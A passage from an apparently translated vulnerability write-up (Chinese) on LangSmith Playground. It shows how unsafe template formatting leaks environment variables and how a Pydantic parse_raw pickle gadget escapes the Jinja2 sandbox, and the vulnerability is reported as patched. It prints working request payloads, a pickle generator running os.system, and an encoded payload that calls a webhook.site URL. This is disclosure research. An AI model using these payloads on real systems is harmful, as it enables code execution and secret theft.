#  利用不安全的模板格式化在 LangSmith Playground 中实现远程代码执行  
0xn3va  securitainment   2026-01-14 05:37  
  
如今，万物皆 AI 驱动，我也不例外。当我在业余时间和工作中使用 LLM 时，LangChain 在我的信息空间中出现得越来越频繁。对于不熟悉 LangChain 的人来说，它是一个相当流行的用于构建 LLM 驱动应用程序的框架。LangChain 是开源的 https://github.com/langchain-ai/langchain  
，目前（2025 年 12 月）在 GitHub 上拥有 120k+  
星标。本质上，LangChain 为您提供构建自己的 LLM 驱动工作流或代理所需的所有构建块。虽然您可以独立使用 LangChain 框架，但也有一个生态系统来增强开发。该生态系统的关键元素之一是 LangSmith，这是一个综合可观测性平台，整合了调试、测试、评估和监控功能。出于好奇，我决定探索 LangSmith，以更好地了解处于 AI 开发前沿的产品能为我们提供什么，以及它们可能存在的攻击面。  
## TL;DR  
  
本文详细介绍了 LangSmith Playground 中一个漏洞的发现和利用过程，该漏洞允许通过不安全的模板格式化执行任意代码。我发现 POST /playground/invoke  
端点可以用于从 JSON 反序列化用户控制的对象，并将它们传递给 f-string  
、mustache  
或 jinja2  
模板格式化器。使用 f-string  
和 mustache  
格式化器，我能够通过链式属性访问泄露环境变量。更深入的调查显示，jinja2  
格式化器可以通过利用 Pydantic 已弃用的 parse_raw  
方法和 pickle 反序列化来实现远程代码执行。该攻击利用了在输入参数中传递序列化对象的能力，并通过调用内部执行不安全操作的方法来绕过 Jinja2 沙箱。  
  
LangChain 团队通过限制格式化器中的属性和索引访问、阻止 Jinja2 模板并引入反序列化期间的对象允许列表以防止加载任意对象，迅速修补了该漏洞。  
  
公告：  
- GHSA-6qv9-48xg-fc7f  
  
- GHSA-c67j-w6g6-q2cm  
  
- GHSA-r399-636x-v7f6  
  
## LangSmith Playground  
  
在快速查看文档后，我访问了 https://eu.smith.langchain.com  
并创建了一个账户。由于 LangSmith 旨在跟踪对 LLM 的请求，最合乎逻辑的做法是创建我的第一个提示，运行它，并在 LangSmith 中查看结果。幸运的是，LangSmith 提供了一个游乐场，这是一个专用的交互式环境，用于快速提示工程和优化，界面如下：  
  
![LangSmith Playground](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCPykEBv4hqdHDejr9CQX4Q87D22mVxibzQbTic1n2zYNW763hd38uC6fMUB1n91ryPHdvLicTBqbA32Q/640?wx_fmt=png&from=appmsg "")  
  
LangSmith Playground  
  
游乐场是一个交互式测试环境，您可以在其中创建提示、设置模型及其参数、实时测试提示，甚至进行多模型比较。换句话说，这里提供了简化提示工程和 LLM 实验所需的一切。我设置了 Caido，将我的 Gemini API 密钥添加到工作区，在输入部分写入 question  
，禁用流式传输（意味着响应会一次性完整显示，而不是逐字显示），然后启动提示。HTTP 历史记录中出现了以下请求：  
```
POST /playground/invoke HTTP/1.1
Host: eu.api.smith.langchain.com
Authorization: Bearer <JWT>
X-User-Id: <User-ID>
X-Tenant-Id: <Tenant-ID>
Content-Type: application/json

{
    "manifest": {
        "lc": 1,
        "type": "constructor",
        "id": [
            "langsmith",
            "playground",
            "PromptPlayground"
        ],
        "kwargs": {
            "first": {
                "lc": 1,
                "type": "constructor",
                "id": [
                    "langchain",
                    "prompts",
                    "chat",
                    "ChatPromptTemplate"
                ],
                "kwargs": {
                    "messages": [
                        {
                            "lc": 1,
                            "type": "constructor",
                            "id": [
                                "langchain",
                                "prompts",
                                "chat",
                                "SystemMessagePromptTemplate"
                            ],
                            "kwargs": {
                                "prompt": {
                                    "lc": 1,
                                    "type": "constructor",
                                    "id": [
                                        "langchain",
                                        "prompts",
                                        "prompt",
                                        "PromptTemplate"
                                    ],
                                    "kwargs": {
                                        "input_variables": [],
                                        "template_format": "f-string",
                                        "template": "You are a chatbot."
                                    }
                                }
                            }
                        },
                        {
                            "lc": 1,
                            "type": "constructor",
                            "id": [
                                "langchain",
                                "prompts",
                                "chat",
                                "HumanMessagePromptTemplate"
                            ],
                            "kwargs": {
                                "prompt": {
                                    "lc": 1,
                                    "type": "constructor",
                                    "id": [
                                        "langchain",
                                        "prompts",
                                        "prompt",
                                        "PromptTemplate"
                                    ],
                                    "kwargs": {
                                        "input_variables": [
                                            "question"
                                        ],
                                        "template_format": "f-string",
                                        "template": "{question}"
                                    }
                                }
                            }
                        }
                    ],
                    "input_variables": [
                        "question"
                    ]
                }
            },
            "last": {
                "lc": 1,
                "type": "constructor",
                "id": [
                    "langchain",
                    "schema",
                    "runnable",
                    "RunnableBinding"
                ],
                "kwargs": {
                    "bound": {
                        "lc": 1,
                        "type": "constructor",
                        "id": [
                            "langchain_google_genai",
                            "chat_models",
                            "ChatGoogleGenerativeAI"
                        ],
                        "kwargs": {
                            "temperature": 0,
                            "top_p": 1,
                            "model": "gemini-2.5-flash",
                            "google_api_key": {
                                "id": [
                                    "GOOGLE_API_KEY"
                                ],
                                "lc": 1,
                                "type": "secret"
                            },
                            "max_tokens": 100
                        }
                    },
                    "kwargs": {}
                }
            }
        }
    },
    "secrets": {},
    "options": {},
    "use_or_fallback_to_workspace_secrets": true,
    "input": {
        "question": "say hi"
    },
    "repetitions": 1
}
```  
  
查看请求时，我的第一个想法是："manifest 包含可序列化对象吗？这是某种自定义序列化吗？"显然，当你看到这样的东西时，你会深入研究它们。让我们仔细看看请求中的 manifest  
：  
```
{
    "lc": 1,
    "type": "constructor",
    "id": [
        "langsmith",
        "playground",
        "PromptPlayground"
    ],
    "kwargs": {
        "first": {
            // ...
        },
        "last": {
            // ...
        }
    }
}
```  
  
它确实看起来像一个类型为 langsmith.playground.PromptPlayground  
的序列化对象，初始化参数为 first  
和 last  
。由于我不熟悉 LangChain 内部实现的细节，这个假设并没有让我完全理解这种序列化机制的功能，包括对可以反序列化哪些对象的限制或强制执行哪些验证机制。然而，我注意到请求中另一个有趣的地方：多次引用 langchain  
，例如 "id": ["langchain", "prompts", "chat", "ChatPromptTemplate"]  
，这让我想到这段代码可能是 LangChain 框架的一部分的开源代码，我可以查看它以获取缺失的上下文。我从 https://github.com/langchain-ai/langchain  
克隆了源代码，并在那里找到了所有提到的类。在查看 langchain_core.runnables  
模块时，我偶然发现了 RunnableSequence 类。RunnableSequence  
按顺序将多个可运行对象链接在一起，创建数据处理管道。序列中的每个步骤都从上一步的输出接收其输入。在 Python 代码中，它看起来像这样：  
```
from langchain_core.runnables import RunnableSequence, RunnableLambda

def add_one(x: int) -> int:
    return x + 1

def mul_two(x: int) -> int:
    return x * 2

runnable_1 = RunnableLambda(add_one)
runnable_2 = RunnableLambda(mul_two)
sequence = RunnableSequence(first=runnable_1, last=runnable_2)
sequence.invoke(1)
```  
  
您可能已经注意到，RunnableSequence  
接受与 manifest  
中 langsmith.playground.PromptPlayground  
相同的 first  
和 last  
参数。显然，manifest  
使用自定义序列化机制定义了一个数据处理管道，允许在 Python 代码中创建自定义管道。  
## 从 JSON 加载对象  
  
下一步是了解序列化的工作原理。结果表明，请求中使用的所有类都扩展了 langchain_core.load.serializable.Serializable 类，反序列化（或恢复）过程在 langchain_core.load.load.Reviver 中实现。下面展示了 Reviver  
的简化代码：  
```
class Reviver:
    """Reviver for JSON objects."""

    def __call__(self, value: dict[str, Any]) -> Any:
        # 1. 省略对 `secret` 和 `not_implemented` 值类型的处理
        # 2. 处理 `constructor` 值类型
        if (
            value.get("lc") == 1
            and value.get("type") == "constructor"
            and value.get("id") is not None
        ):
            # 3. 简化的模块导入
            [*namespace, name] = value["id"]
            mod = importlib.import_module(".".join(namespace))
            # 4. 获取目标类并确保它扩展 Serializable
            cls = getattr(mod, name)
            if not issubclass(cls, Serializable):
                msg = f"Invalid namespace: {value}"
                raise ValueError(msg)
            # 5. 创建目标类的实例
            kwargs = value.get("kwargs", {})
            return cls(**kwargs)
```  
  
逻辑很简单：id  
用于查找指定的类，如果它扩展 Serializable  
，则创建一个实例。这意味着潜在的 sink 必须扩展 Serializable  
并在初始化期间执行一些危险操作。当然，代码中某处的某个类可能满足这些标准。然而，这条路对我来说似乎不太可疑，我决定转而关注模板格式化。  
## 模板格式化  
  
查看请求中的 manifest  
，我发现了 PromptTemplate  
的模板格式化：  
```
{
    "lc": 1,
    "type": "constructor",
    "id": [
        "langchain",
        "prompts",
        "prompt",
        "PromptTemplate"
    ],
    "kwargs": {
        "input_variables": [
            "question"
        ],
        "template_format": "f-string",
        "template": "{question}"
    }
}
```  
  
对 langchain_core.prompts.prompt.PromptTemplate 类的审查揭示了一个相当有趣的细节：  
```
class PromptTemplate(StringPromptTemplate):
    # ...
    template_format: PromptTemplateFormat = "f-string"
    """The format of the prompt template.
    Options are: 'f-string', 'mustache', 'jinja2'."""
```  
  
PromptTemplate  
支持 f-string  
、mustache  
和 jinja2  
格式化类型。发现对 jinja2  
的支持有点令人惊讶。然而，我怀疑 LangSmith 是否允许使用 jinja2  
，因为这段代码是 LangChain 库的一部分，LangSmith 可能对格式化类型实施了验证。我在请求中发送了下面的 manifest 来验证 LangSmith 对 jinja2  
格式化的支持，并在响应中收到了从传递的模板渲染的 hi  
。  
```
{
    "manifest": {
        // ...
        {
            "lc": 1,
            "type": "constructor",
            "id": [
                "langchain",
                "prompts",
                "chat",
                "HumanMessagePromptTemplate"
            ],
            "kwargs": {
                "prompt": {
                    "lc": 1,
                    "type": "constructor",
                    "id": [
                        "langchain",
                        "prompts",
                        "prompt",
                        "PromptTemplate"
                    ],
                    "kwargs": {
                        "input_variables": [
                            "question"
                        ],
                        "template_format": "jinja2",
                        "template": "Say {{question}}"
                    }
                }
            }
        }
        // ...
    },
    "input": {
        "question": "hi"
    }
}
```  
  
事实上，它在 LangSmith 中有效。我开始深入研究格式化实现的细节。PromptTemplate  
实现了 format  
方法，该方法负责调用相关的格式化器：  
```
class PromptTemplate(StringPromptTemplate):
    def format(self, **kwargs: Any) -> str:
        kwargs = self._merge_partial_and_user_variables(**kwargs)
        return DEFAULT_FORMATTER_MAPPING[self.template_format](self.template, **kwargs)
```  
  
其中 DEFAULT_FORMATTER_MAPPING 在 langchain_core.prompts.string  
模块中定义为以下字典：  
```
DEFAULT_FORMATTER_MAPPING: dict[str, Callable] = {
    "f-string": formatter.format,
    "mustache": mustache_formatter,
    "jinja2": jinja2_formatter,
}
```  
  
简而言之，f-string  
格式化由内置的 string.Formatter 处理，mustache  
由 LangChain 对 https://github.com/noahmorrison/chevron  
的改编处理，jinja2  
由使用 SandboxedEnvironment  
的 Jinja2 处理。对我来说不幸的是，这些格式化器没有提供访问文件或执行代码的直接方法。以防万一，我检查了 Jinja2 包版本——它是最新的，没有已知的沙箱逃逸——以及可用作 gadget 的对象的上下文，但上下文不包含任何额外的对象。剩下的唯一选择是以某种方式将对象作为输入传递，并使用它来访问危险的原语。在这一点上，我不确定可以将什么作为输入传递，所以是时候测试各种数据类型了：布尔值、整数、字符串、列表、字典。结果表明，所有这些都可以作为输入传递。例如，您可以在输入中发送字典，如下所示：  
```
{
    "manifest": {
        // ...
        {
            "lc": 1,
            "type": "constructor",
            "id": [
                "langchain",
                "prompts",
                "chat",
                "HumanMessagePromptTemplate"
            ],
            "kwargs": {
                "prompt": {
                    "lc": 1,
                    "type": "constructor",
                    "id": [
                        "langchain",
                        "prompts",
                        "prompt",
                        "PromptTemplate"
                    ],
                    "kwargs": {
                        "input_variables": [
                            "question"
                        ],
                        "template_format": "f-string",
                        "template": "Say {question}"
                    }
                }
            }
        }
        // ...
    },
    "input": {
        "question": {
            "foo": "bar"
        }
    }
}
```  
  
并在响应中接收格式化为字符串的相同字典：  
```
`{'foo': 'bar'}`
```  
  
当我尝试传递带有序列化对象的字典时，我观察到了相同的行为，它只是在响应中返回字典。换句话说，后端没有加载 input  
中的序列化对象，而是将其视为字典。  
## 探索 f-string 和 mustache 格式化  
  
在使用不同的格式化器时，我认为 f-string  
和 mustache  
不像 jinja2  
那样沙箱化，可能可以用来访问一些 gadget。这促使我探索这两个格式化器的实现。在查看 string.Formatter  
的源代码后（事实证明，只需阅读 文档 就足够了），我发现可以为传递的对象获取元素和属性：  
```
>>> from string import Formatter
>>> formatter = Formatter()
>>> formatter.format("{foo[0]}", foo=["bar"])
'bar'
>>> formatter.format("{foo[bar]}", foo={"bar":"asd"})
'asd'
>>> formatter.format("{foo.__class__}", foo="")
"<class 'str'>"
```  
  
但是，无法进行调用：  
```
>>> formatter.format("{foo.__class__.__base__.__subclasses__}", foo="")
'<built-in method __subclasses__ of type object at 0x100eb79b0>'
>>> formatter.format("{foo.__class__.__base__.__subclasses__()}", foo="")
AttributeError: type object 'object' has no attribute '__subclasses__()'
```  
  
对于 mustache  
可以观察到类似的行为，不同之处在于点 .  
运算符用于元素访问。  
```
>>> from langchain_core.prompts.string import mustache_formatter
>>> mustache_formatter("{{foo.0}}", foo=["bar"])
'bar'
>>> mustache_formatter("{{foo.bar}}", foo={"bar":"asd"})
'asd'
>>> mustache_formatter("{{foo.__class__}}", foo="")
"&lt;class 'str'&gt;"
>>> mustache_formatter("{{foo.__class__.__base__.__subclasses__}}", foo="")
'&lt;built-in method __subclasses__ of type object at 0x1032779b0&gt;'
>>> mustache_formatter("{{foo.__class__.__base__.__subclasses__()}}", foo="")
''
```  
  
我知道的所有访问有用原语的方法都以某种方式需要函数调用。不幸的是，内置类型被证明是无用的，所以我不得不改变策略。  
## 深入挖掘  
  
由于没有更好的想法，我去阅读了 LangSmith 文档。在浏览各个页面后，我发现了部署模式页面：Cloud、Hybrid 和 Self-hosted。我更详细地研究了 Self-hosted 模式，发现它附带了一组 Docker 镜像，这些镜像在 Docker Hub 上公开可用。这一发现开启了访问后端组件并获取额外上下文的可能性。多亏了非常有帮助的文档，我能够将这些镜像映射到服务架构并识别对我最感兴趣的镜像。我的主要目标是 langchain/langsmith-playground 镜像。在探索 POST /playground/invoke 端点的处理程序后，我发现它支持序列化对象：  
```
def format_example_inputs(inputs: Union[dict, list]):
    if isinstance(inputs, list):
        # ...
    else:
        if _is_serialized_message(inputs):
            return load(inputs, ignore_unserializable_fields=True)
        # ...
```  
  
传递的 inputs  
被检查是否包含序列化对象，使用 _is_serialized_message  
函数，反序列化由 lanchain_core.load  
的 load  
函数处理，该函数内部调用前面提到的 Reviver  
。_is_serialized_message  
验证传递的输入中的字段，并检查 id  
字段中的最后一个元素是否存在于允许进行反序列化的类名列表中。只有以下类名被列入反序列化白名单：  
```
_SERIALIZED_MESSAGE_IDS: list = [
    "AIMessage",
    "AIMessageChunk",
    "ChatMessage",
    "ChatMessageChunk",
    "FunctionMessage",
    "FunctionMessageChunk",
    "HumanMessage",
    "HumanMessageChunk",
    "SystemMessage",
    "SystemMessageChunk",
    "ToolMessage",
    "ToolMessageChunk",
    "RemoveMessage",
]
```  
  
这回答了我关于为什么使用序列化对象的尝试不成功的问题。输入应该只接受来自 langchain_core.messages  
模块的对象。我创建了一个新的输入，里面有一个序列化对象来测试这个：  
```
{
    "manifest": {
        // ...
        {
            "lc": 1,
            "type": "constructor",
            "id": [
                "langchain",
                "prompts",
                "chat",
                "HumanMessagePromptTemplate"
            ],
            "kwargs": {
                "prompt": {
                    "lc": 1,
                    "type": "constructor",
                    "id": [
                        "langchain",
                        "prompts",
                        "prompt",
                        "PromptTemplate"
                    ],
                    "kwargs": {
                        "input_variables": [
                            "msg"
                        ],
                        "template_format": "jinja2",
                        "template": "Say {{msg.text}}"
                    }
                }
            }
        }
        // ...
    },
    "input": {
        "msg": {
            "lc": 1,
            "type": "constructor",
            "id": [
                "langchain_core",
                "messages",
                "HumanMessage"
            ],
            "kwargs": {
                "content": "hi",
                "additional_kwargs": {}
            }
        }
    }
}
```  
  
响应包含 hi  
，这意味着我可以在模板内传递非内置对象。  
## 本地测试环境  
  
对可序列化对象支持的发现扩大了我寻找 gadget 的选项，我为此设置了一个本地测试环境。如果您想重现进一步描述的任何内容，可以按如下方式配置游乐场。  
```
virtualenv -p python3 venv
source venv/bin/activate
pip install langchain-core==1.0.4
pip install jinja2
```  
```
>>> from langchain_core.prompts.string import DEFAULT_FORMATTER_MAPPING
>>> from langchain_core.messages import HumanMessage
>>> f_string_formatter = DEFAULT_FORMATTER_MAPPING["f-string"]
>>> mustache_formatter = DEFAULT_FORMATTER_MAPPING["mustache"]
>>> jinja2_formatter = DEFAULT_FORMATTER_MAPPING["jinja2"]
>>> f_string_formatter("{msg.text}", msg=HumanMessage("foo"))
'foo'
>>> mustache_formatter("{{msg.text}}", msg=HumanMessage("foo"))
'foo'
>>> jinja2_formatter("{{msg.text}}", msg=HumanMessage("foo"))
'foo'
```  
## 使用 f-string 和 mustache 泄露环境变量  
  
我的第一个目标是 f-string  
和 mustache  
，我想看看当非内置对象传递给模板时可以做什么。您可能还记得，f-string  
和 mustache  
只允许访问属性和获取元素，但不允许进行调用。理想情况下，应该有一个属性或元素返回不需要调用的原语，并且仍然从攻击者的角度提供一些有用的东西。我首先想到的是尝试通过 os.environ  
访问环境变量。为此，我需要访问 os  
模块，该模块必须被导入并存在于模块的全局命名空间中，即在 __globals__  
内。每个 Python 函数和方法都有一个 __globals__  
属性，该属性提供对定义它的模块的全局命名空间的访问。此命名空间包含所有模块级变量和导入的模块，使其成为利用的宝贵目标。例如，我们可以使用 HumanMessage  
实例的任何可用方法来访问全局命名空间：  
```
>>> HumanMessage("").pretty_repr
<bound method BaseMessage.pretty_repr of HumanMessage(content='', additional_kwargs={}, response_metadata={})>
>>> HumanMessage("").pretty_repr.__globals__
{'__name__': 'langchain_core.messages.base', ... 'get_msg_title_repr': <function get_msg_title_repr at 0x109486520>}
```  
  
由于 __globals__  
包括所有导入的模块，因此可以通过浏览不同的模块来遍历导入链。例如，langchain_core.messages.human  
模块（定义 HumanMessage  
的地方）进行以下导入：  
```
from langchain_core.messages import content as types
```  
  
可以按如下方式访问此导入的模块：  
```
>>> HumanMessage("").pretty_repr.__globals__["types"]
<module 'langchain_core.messages.content' from '/venv/lib/python3.13/site-packages/langchain_core/messages/content.py'>
```  
  
换句话说，我的目标是找到一个导入 os  
的模块，并且可以从 HumanMessage  
实例（或任何其他允许的可序列化对象）可访问的全局命名空间访问。经过简短的搜索，发现了以下链：  
```
>>> HumanMessage("").pretty_repr.__globals__["types"].ensure_id.__globals__["os"].environ
environ({'TERM_SESSION_ID': 'w0t0p0:F39B7820-17CC-4D05-BAB1-1D2782C21488' ...})
```  
  
或使用 f-string  
格式化：  
```
>>> f_string_formatter("{msg.pretty_repr.__globals__[types].ensure_id.__globals__[os].environ}", msg=HumanMessage(""))
'environ({\'TERM_SESSION_ID\': \'w0t0p0:F39B7820-17CC-4D05-BAB1-1D2782C21488\' ...})'
```  
  
请注意，无需引用元素键，即 __globals__[types]  
而不是 __globals__["types"]  
。  
  
类似的 payload 可以用于 mustache  
来访问环境变量：  
```
>>> mustache_formatter("{{msg.pretty_repr.__globals__.types.ensure_id.__globals__.os.environ}}", msg=HumanMessage(""))
"environ({'TERM_SESSION_ID': 'w0t0p0:F39B7820-17CC-4D05-BAB1-1D2782C21488' ...})"
```  
  
我制作了一个带有识别出的 payload 的请求并将其发送到 LangSmith 以重现此行为：  
> 我必须在 input  
中添加一个键为 msg.pretty_repr.__globals__[types].ensure_id.__globals__[os].environ  
的元素以避免验证错误。问题是后端从提供的模板中提取所有变量名，并在 input  
中查找它们是否存在。  
  
```
{
    "manifest": {
        // ...
        {
            "lc": 1,
            "type": "constructor",
            "id": [
                "langchain",
                "prompts",
                "chat",
                "HumanMessagePromptTemplate"
            ],
            "kwargs": {
                "prompt": {
                    "lc": 1,
                    "type": "constructor",
                    "id": [
                        "langchain",
                        "prompts",
                        "prompt",
                        "PromptTemplate"
                    ],
                    "kwargs": {
                        "input_variables": [
                            "msg"
                        ],
                        "template_format": "f-string",
                        "template": "Say {msg.pretty_repr.__globals__[types].ensure_id.__globals__[os].environ}"
                    }
                }
            }
        }
        // ...
    },
    "input": {
        "msg.pretty_repr.__globals__[types].ensure_id.__globals__[os].environ": "test",
        "msg": {
            "lc": 1,
            "type": "constructor",
            "id": [
                "langchain_core",
                "messages",
                "HumanMessage"
            ],
            "kwargs": {
                "content": "hi",
                "additional_kwargs": {}
            }
        }
    }
}
```  
  
后端在响应中返回了所有环境变量：  
```
"output": {
    "lc": 1,
    "type": "constructor",
    "id": ["langchain", "schema", "messages", "AIMessage"],
    "kwargs": {
        "content": "environ({'PATH': '/usr/local/sbin:/usr/local/bin:/usr/bin:/usr/sbin:/sbin:/bin', 'HOSTNAME': 'langsmith-playground-7bbf88bd5c-d2h9j', ...})",
        // ...
    }
}
```  
## Jinja2 沙箱逃逸和远程代码执行  
  
与 f-string  
和 mustache  
不同，jinja2  
支持调用，但由于 SandboxedEnvironment  
，我无法使用与 f-string  
和 mustache  
使用的类似链。  
```
>>> jinja2_formatter("{{msg.pretty_repr.__globals__[types].ensure_id.__globals__[os].environ}}", msg=HumanMessage(""))
Traceback (most recent call last):
...
jinja2.exceptions.SecurityError: access to attribute '__globals__' of 'method' object is unsafe.
```  
  
在继续查找 gadget 的细节之前，值得深入了解 Jinja2 的沙箱环境，以更好地了解寻找什么来绕过沙箱。SandboxedEnvironment  
定义了模板内可用的所有关键操作，如 getitem  
、getattr  
和 call  
。这允许 SandboxedEnvironment  
在模板渲染期间拦截和控制属性访问、方法调用、运算符和数据结构变异。例如，当您尝试在模板 {{obj.__class__}}  
中访问属性时，您实际上是在调用 SandboxedEnvironment.getattr(obj, "__class__")  
，并且由于任何以 _  
(下划线) 开头的属性都被阻止，您将在响应中收到 Undefined  
：  
```
>>> jinja2_formatter("{{msg.__class__}}", msg=HumanMessage(""))
''
```  
  
但是，Jinja2 的沙箱不会检查或控制模板执行上下文之外发生的事情。如果您将一个函数传递给模板，该函数内部获取禁止的属性，它将起作用：  
```
>>> jinja2_formatter("{{func('')}}", func=lambda x: x.__class__)
"<class 'str'>"
```  
  
因此，我的目标是找到一个读取/写入文件或执行代码/命令的方法，并将其用于利用。记住这一点，我开始查看允许从 input  
加载的类中可用的方法。HumanMessage  
具有以下继承路径：HumanMessage > BaseMessage > Serializable > BaseModel  
，其中 BaseModel  
是 Pydantic 的 BaseModel  
。说实话，我并没有立即重视从 BaseModel  
继承。然而，在花了一些时间挖掘之后，我查看了 BaseModel  
方法的代码，最终发现了已弃用的 parse_raw  
方法：  
```
class BaseModel(metaclass=_model_construction.ModelMetaclass):
    # ...
    @classmethod
    @typing_extensions.deprecated(
        'The `parse_raw` method is deprecated; if your data is JSON use `model_validate_json`, '
        'otherwise load the data then use `model_validate` instead.',
        category=None,
    )
    def parse_raw(  # noqa: D102
        cls,
        b: str | bytes,
        *,
        content_type: str | None = None,
        encoding: str = 'utf8',
        proto: DeprecatedParseProtocol | None = None,
        allow_pickle: bool = False,
    ) -> Self:  # pragma: no cover
        warnings.warn(
            'The `parse_raw` method is deprecated; if your data is JSON use `model_validate_json`, '
            'otherwise load the data then use `model_validate` instead.',
            category=PydanticDeprecatedSince20,
            stacklevel=2,
        )
        from .deprecated import parse

        try:
            obj = parse.load_str_bytes(
                b,
                proto=proto,
                content_type=content_type,
                encoding=encoding,
                allow_pickle=allow_pickle,
            )
        except (ValueError, TypeError) as exc:
            # ...
            raise pydantic_core.ValidationError.from_exception_data(cls.__name__, [error])
        return cls.model_validate(obj)
```  
  
该方法从字符串或字节加载对象，看起来支持序列化的 pickle 对象。这绝对是一个坏兆头。深入研究 parse.load_str_bytes  
函数以探索反序列化逻辑，我发现可以传递序列化的 pickle 对象，它将被加载：  
```
@deprecated('`load_str_bytes` is deprecated.', category=None)
def load_str_bytes(
    b: str | bytes,
    *,
    content_type: str | None = None,
    encoding: str = 'utf8',
    proto: Protocol | None = None,
    allow_pickle: bool = False,
    json_loads: Callable[[str], Any] = json.loads,
) -> Any:
    warnings.warn('`load_str_bytes` is deprecated.', category=PydanticDeprecatedSince20, stacklevel=2)
    # ...
    if proto == Protocol.json:
        if isinstance(b, bytes):
            b = b.decode(encoding)
        return json_loads(b)  # type: ignore
    elif proto == Protocol.pickle:
        if not allow_pickle:
            raise RuntimeError('Trying to decode with pickle with allow_pickle=False')
        bb = b if isinstance(b, bytes) else b.encode()  # type: ignore
        return pickle.loads(bb)
    else:
        raise TypeError(f'Unknown protocol: {proto}')
```  
  
这意味着可以执行任意代码，这要归功于 pickle 的 __reduce__  
机制，该机制允许对象在反序列化期间指定要调用的任意函数。我编写了一个小的 Python 脚本来生成 payload：  
```
import pickle
import os

class Pwn:
    def __reduce__(self):
        return (os.system, ("whoami",))

payload = str(pickle.dumps(Pwn())).removeprefix("b'").removesuffix("'").replace("\\", "\\\\")
print(payload)
```  
  
因为 pickle.dumps  
返回字节，所以 Python 脚本将序列化对象编码为转义的十六进制字节，可以将其作为字符串传递给模板。生成的编码 payload 如下所示：  
```
\\x80\\x04\\x95!\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x05posix\\x94\\x8c\\x06system\\x94\\x93\\x94\\x8c\\x06whoami\\x94\\x85\\x94R\\x94.
```  
  
要利用 parse_raw  
，生成的 payload 必须转换回 pickle 可以反序列化的字节。为此，可以使用 payload.encode().decode('unicode_escape').encode('latin1')  
链来执行必要的转换。运行以下本地测试确认了代码执行：  
```
>>> payload = "\\x80\\x04\\x95!\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x05posix\\x94\\x8c\\x06system\\x94\\x93\\x94\\x8c\\x06whoami\\x94\\x85\\x94R\\x94."
>>> jinja2_formatter("{{msg.parse_raw(payload.encode().decode('unicode_escape').encode('latin1'),allow_pickle=True,proto='pickle')}}", msg=HumanMessage(""), payload=payload)
0xn3va
Traceback (most recent call last):
  ...
```  
  
为了确认 LangSmith 中的代码执行，我必须准备另一个 payload，该 payload 向 URL 发出请求，因为后端为加载的对象抛出了 Pydantic 验证错误，并且响应中仅返回错误消息。最终的 manifest 和 input 如下：  
```
{
    "manifest": {
        // ...
        {
            "lc": 1,
            "type": "constructor",
            "id": [
                "langchain",
                "prompts",
                "chat",
                "HumanMessagePromptTemplate"
            ],
            "kwargs": {
                "prompt": {
                    "lc": 1,
                    "type": "constructor",
                    "id": [
                        "langchain",
                        "prompts",
                        "prompt",
                        "PromptTemplate"
                    ],
                    "kwargs": {
                        "input_variables": [
                            "payload",
                            "msg"
                        ],
                        "template_format": "jinja2",
                        "template": "Say {{msg.parse_raw(payload.encode().decode('unicode_escape').encode('latin1'),allow_pickle=True,proto='pickle')}}"
                    }
                }
            }
        }
    },
    "input": {
        "payload": "\\x80\\x04\\x95^\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x0eurllib.request\\x94\\x8c\\x07urlopen\\x94\\x93\\x94\\x8c9https://webhook.site/01c5382f-8bc8-4549-92e2-1f16c933187a\\x94\\x85\\x94R\\x94.",
        "msg": {
            "lc": 1,
            "type": "constructor",
            "id": [
                "langchain_core",
                "messages",
                "HumanMessage"
            ],
            "kwargs": {
                "content": "",
                "additional_kwargs": {}
            }
        }
    }
}
```  
  
我最终收到了回调：  
  
![langsmith\_playground\_callback](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCPykEBv4hqdHDejr9CQX4Q81DyRSB3Vh2Tt3QNlS0543hiaeSIagG5Cr6VDljQSqf6ibndfV1MUssBA/640?wx_fmt=png&from=appmsg "")  
  
langsmith_playground_callback  
## 影响  
  
乍一看，影响很明显：在 LangSmith 的基础设施内执行任意代码，并有能力进一步发展攻击。但是，值得注意的是，游乐场与核心后端组件隔离，这些组件可以完全访问客户数据。即使对内部 API 的请求也需要攻击者付出额外的努力，因为游乐场不共享服务到服务身份验证所需的密钥。另一方面，游乐场并非完全隔离，其利用可以为攻击提供很好的机会。  
  
尽管如此，在向 LangChain 团队报告漏洞后，我继续探索 LangChain 生态系统。在我阅读文档的一次会议中，我发现了一段非常有趣的内容，关于 以编程方式管理提示。此页面描述了如何使用 LangSmith SDK 将提示推送到 LangSmith Hub 并从 LangSmith Hub 拉取提示。LangSmith Hub 是一个用于版本控制、共享和管理提示的集中式存储库。它允许开发人员像处理代码一样处理提示：将它们推送到 Hub，按名称和版本拉取它们，跟踪提交之间的更改，等等。Hub 是提示的一种单一事实来源，允许开发人员将代码与提示分离。实际上，开发人员可以在其应用程序中引用 Hub 中的提示，并直接在 LangSmith 中迭代这些提示，所有更改都会被跟踪、可审查和可重现。文档中另一个引人入胜的页面专门介绍了使用 webhook 将提示与 GitHub 同步。从本质上讲，所有这些功能都解锁了将 LangSmith 集成到 CI/CD 或开发工作流中的机会。例如，LangSmith 中的新提交或标签可以触发 GitHub 中的工作流，该工作流将从 Hub 拉取提示并调用它，甚至使用新的提示引用重新部署应用程序。这让我产生了一个想法：如果我可以向 LangSmith 推送一个不需要恶意输入并在调用时执行代码的提示会怎样？如果是这样，如果攻击者可以访问泄露的 LangSmith API 密钥并且目标工作区具有这种自动化，这将是一个相当有趣的利用链。我开始探索数据如何在 LangChain 的数据管道步骤之间流动。从 RunnableSequence  
到模板跟踪控制流，我发现 PromptTemplate  
从 BasePromptTemplate  
继承了 partial_variables  
变量：  
```
# https://github.com/langchain-ai/langchain/blob/dad50e5624dda9ee44636dfda2a488fdae7e23a7/libs/core/langchain_core/prompts/base.py#L44
class BasePromptTemplate(
    RunnableSerializable[dict, PromptValue], ABC, Generic[FormatOutputType]
):
    """Base class for all prompt templates, returning a prompt."""

    # ...
    partial_variables: Mapping[str, Any] = Field(default_factory=dict)
    """A dictionary of the partial variables the prompt template carries.

    Partial variables populate the template so that you don't need to pass them in every
    time you call the prompt.
    """
```  
  
partial_variables  
接受模板中使用的变量，似乎我应该能够直接在 manifest 中指定它们，而不是将变量传递给 input  
。这正是我要找的。另一个重要的细节：partial_variables  
允许绕过对传递给 input  
的可序列化对象的限制，因为 partial_variables  
